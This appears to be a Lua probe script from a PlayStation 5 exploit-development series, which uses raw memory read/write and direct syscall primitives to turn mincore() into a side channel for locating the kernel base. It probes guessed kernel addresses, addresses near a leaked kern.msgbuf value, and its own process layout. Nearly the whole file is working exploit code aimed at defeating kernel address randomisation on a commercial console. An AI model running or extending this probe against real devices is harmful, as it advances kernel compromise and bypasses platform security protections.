-- CRASH_CLASS: LOW
-- PROBE 43l: mincore() as KASLR side-channel oracle
--
-- Context: Probe 42i confirmed mincore() works (ret=0, vec=0x1F for 5 resident
-- pages). mincore() reports whether virtual pages are resident in physical memory.
-- On FreeBSD, kernel text/data is mapped at DMAP or KERNBASE. If we can probe
-- page residency at guessed kernel addresses via mincore(), we can detect the
-- kernel base without needing a direct pointer leak. Even if kernel VA probing
-- fails, we can use mincore() to map our own process's memory layout precisely.

print("=== PROBE 43l: MINCORE KASLR ORACLE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end

local pid = to_num(syscall.getpid())
print("pid: " .. pid)

local sc_mincore = make_syscall(78)  -- mincore
local PAGE = 0x4000  -- 16KB pages

-- === STEP 1: Verify mincore works on our own mappings ===
print("--- STEP 1: Verify mincore on known mappings ---")

-- Get eboot base (known mapped region)
local sc_info = make_syscall(593)
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc_info(uint64(0), info) end)
local eboot_lo = safe_rd(info + 0x108) or 0
local eboot_hi = safe_rd(info + 0x10C) or 0
local eboot_sz_lo = safe_rd(info + 0x110) or 0
print(string.format("  eboot text: %08X_%08X size: 0x%X", eboot_hi, eboot_lo, eboot_sz_lo))

-- Test mincore on eboot pages
local npages = 4
local vec = memory.alloc(npages + 16)
for i = 0, npages - 1 do
    pcall(function() memory.write_byte(vec + i, 0xFF) end)
end
local eboot_addr = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
local ok1, ret1 = pcall(function()
    return sc_mincore(eboot_addr, uint64(npages * PAGE), uint64(vec),
        uint64(0), uint64(0), uint64(0))
end)
if ok1 then
    local bits = ""
    for i = 0, npages - 1 do
        local b = safe_rb(vec + i)
        bits = bits .. string.format("%02X ", b or 0xFF)
    end
    print(string.format("  eboot mincore: ret=%d vec=[%s]", to_num(ret1), bits))
else
    print("  eboot mincore: CRASH")
end

-- Test on GPU mmap (heap region)
local sc_mmap = make_syscall(477)
local ok_gpu, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(32 * PAGE), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if ok_gpu then
    local gh, gl = get_hi_lo(gpu)
    print(string.format("  GPU mmap: %08X_%08X", gh, gl))
    local vec2 = memory.alloc(32 + 16)
    for i = 0, 31 do
        pcall(function() memory.write_byte(vec2 + i, 0xFF) end)
    end
    local ok2, ret2 = pcall(function()
        return sc_mincore(gpu, uint64(32 * PAGE), uint64(vec2),
            uint64(0), uint64(0), uint64(0))
    end)
    if ok2 then
        local resident = 0
        for i = 0, 31 do
            local b = safe_rb(vec2 + i)
            if b and (b % 2) == 1 then resident = resident + 1 end
        end
        print(string.format("  GPU mincore: ret=%d resident=%d/32", to_num(ret2), resident))
    end
end

-- Test on unmapped address (should fail)
local vec3 = memory.alloc(16)
pcall(function() memory.write_byte(vec3, 0xFF) end)
local ok3, ret3 = pcall(function()
    return sc_mincore(uint64(0x7F0000000000), uint64(PAGE), uint64(vec3),
        uint64(0), uint64(0), uint64(0))
end)
if ok3 then
    print(string.format("  unmapped mincore: ret=%d", to_num(ret3)))
else
    print("  unmapped mincore: CRASH")
end

-- === STEP 2: Probe kernel virtual address ranges ===
print("")
print("--- STEP 2: Kernel VA range probing ---")
-- FreeBSD kernel VA ranges to test:
-- KERNBASE typically at 0xFFFF800000000000+ on amd64
-- DMAP starts at 0xFFFFF80000000000 on stock FreeBSD
-- PS5 may use different layout

local kernel_ranges = {
    {0xFFFF8000, 0x00000000, "KERNBASE low"},
    {0xFFFF8000, 0x00200000, "KERNBASE +2MB"},
    {0xFFFF8000, 0x01000000, "KERNBASE +16MB"},
    {0xFFFF8000, 0x02000000, "KERNBASE +32MB"},
    {0xFFFF8001, 0x00000000, "KERNBASE +4GB"},
    {0xFFFF8002, 0x00000000, "KERNBASE +8GB"},
    {0xFFFF8004, 0x00000000, "KERNBASE +16GB"},
    {0xFFFF8008, 0x00000000, "KERNBASE +32GB"},
    {0xFFFF8010, 0x00000000, "KERNBASE +64GB"},
    {0xFFFF8020, 0x00000000, "KERNBASE +128GB"},
    {0xFFFF8040, 0x00000000, "KERNBASE +256GB"},
    {0xFFFF8080, 0x00000000, "KERNBASE +512GB"},
    {0xFFFFF800, 0x00000000, "DMAP base"},
    {0xFFFFF800, 0x10000000, "DMAP +256MB"},
    {0xFFFFF800, 0x80000000, "DMAP +2GB"},
    {0xFFFFF801, 0x00000000, "DMAP +4GB"},
    {0xFFFFFF80, 0x00000000, "High kernel"},
}

local vec4 = memory.alloc(16)
for _, range in ipairs(kernel_ranges) do
    pcall(function() memory.write_byte(vec4, 0xFF) end)
    local addr = uint64(string.format("0x%X%08X", range[1], range[2]))
    local ok, ret = pcall(function()
        return sc_mincore(addr, uint64(PAGE), uint64(vec4),
            uint64(0), uint64(0), uint64(0))
    end)
    if not ok then
        print(string.format("  %s (%08X_%08X): CRASH", range[3], range[1], range[2]))
    else
        local r = to_num(ret)
        local v = safe_rb(vec4) or 0xFF
        if r == 0 then
            print(string.format("  %s (%08X_%08X): ret=0 vec=%02X  *** HIT ***",
                range[3], range[1], range[2], v))
        else
            print(string.format("  %s (%08X_%08X): ret=%d", range[3], range[1], range[2], r))
        end
    end
end

-- === STEP 3: Use kern.msgbuf value as pivot ===
print("")
print("--- STEP 3: Probe around kern.msgbuf value 0x7EF710000 ---")
-- 42b found kern.msgbuf returned 0x7EF710000. Test nearby addresses.
local msgbuf_base_hi = 0x00000007
local msgbuf_base_lo = 0xEF710000

local offsets = {
    {0, 0, "exact"},
    {0, -0x10000, "-64K"},
    {0, 0x10000, "+64K"},
    {0, -0x100000, "-1MB"},
    {0, 0x100000, "+1MB"},
    {0, -0x1000000, "-16MB"},
    {0, 0x1000000, "+16MB"},
}

local vec5 = memory.alloc(16)
for _, off in ipairs(offsets) do
    local test_hi = msgbuf_base_hi + off[1]
    local test_lo = msgbuf_base_lo + off[2]
    if test_lo < 0 then
        test_hi = test_hi - 1
        test_lo = test_lo + 0x100000000
    end
    if test_lo >= 0x100000000 then
        test_hi = test_hi + 1
        test_lo = test_lo - 0x100000000
    end
    -- Align to page
    test_lo = test_lo - (test_lo % PAGE)

    pcall(function() memory.write_byte(vec5, 0xFF) end)
    local addr = uint64(string.format("0x%X%08X", test_hi, test_lo))
    local ok, ret = pcall(function()
        return sc_mincore(addr, uint64(PAGE), uint64(vec5),
            uint64(0), uint64(0), uint64(0))
    end)
    if not ok then
        print(string.format("  0x%08X_%08X (%s): CRASH", test_hi, test_lo, off[3]))
    else
        local r = to_num(ret)
        local v = safe_rb(vec5) or 0xFF
        print(string.format("  0x%08X_%08X (%s): ret=%d vec=%02X",
            test_hi, test_lo, off[3], r, v))
    end
end

-- === STEP 4: Scan our own process VA space for unmapped holes ===
print("")
print("--- STEP 4: Process VA space mapping via mincore ---")
-- Scan typical userland ranges to find mapped regions
local scan_ranges = {
    {0x00000000, 0x00400000, "low 4MB"},
    {0x00000000, 0x10000000, "256MB"},
    {0x00000000, 0x40000000, "1GB"},
    {0x00000000, 0x80000000, "2GB"},
    {0x00000001, 0x00000000, "4GB"},
    {0x00000002, 0x00000000, "8GB"},
    {0x00000004, 0x00000000, "16GB"},
    {0x00000008, 0x00000000, "32GB"},
    {0x00000010, 0x00000000, "64GB"},
    {0x00000020, 0x00000000, "128GB"},
    {0x00000040, 0x00000000, "256GB"},
    {0x00000080, 0x00000000, "512GB"},
    {0x00000100, 0x00000000, "1TB"},
    {0x00000200, 0x00000000, "2TB"},
    {0x00000400, 0x00000000, "4TB"},
    {0x00007F00, 0x00000000, "user high"},
}

local vec6 = memory.alloc(16)
for _, sr in ipairs(scan_ranges) do
    pcall(function() memory.write_byte(vec6, 0xFF) end)
    local addr = uint64(string.format("0x%X%08X", sr[1], sr[2]))
    local ok, ret = pcall(function()
        return sc_mincore(addr, uint64(PAGE), uint64(vec6),
            uint64(0), uint64(0), uint64(0))
    end)
    if not ok then
        print(string.format("  %s (%08X_%08X): CRASH", sr[3], sr[1], sr[2]))
    else
        local r = to_num(ret)
        local v = safe_rb(vec6) or 0xFF
        local tag = ""
        if r == 0 then tag = " *** MAPPED ***" end
        print(string.format("  %s (%08X_%08X): ret=%d vec=%02X%s",
            sr[3], sr[1], sr[2], r, v, tag))
    end
end

print("")
print("=== PROBE 43l COMPLETE ===")
